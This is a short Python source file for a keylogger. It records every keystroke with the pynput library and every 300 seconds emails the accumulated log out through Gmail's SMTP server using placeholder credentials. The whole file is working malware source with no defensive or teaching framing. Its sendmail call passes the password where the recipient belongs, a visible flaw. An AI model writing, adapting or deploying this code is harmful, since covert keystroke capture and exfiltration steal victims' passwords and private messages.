import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "[*] Capturing Keystrokes"
        self.interval = interval
        # The time interval for sending reports to email
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ""
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, content):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, password, content)
        server.quit()

    def start(self):
        keyboad_capture = pynput.keyboard.Listener(on_press=self.key_press)
        with keyboad_capture:
            self.report()
            keyboad_capture.join()


my_Keylogger = Keylogger(300, "email comes here", "password comes here")
my_Keylogger.start()

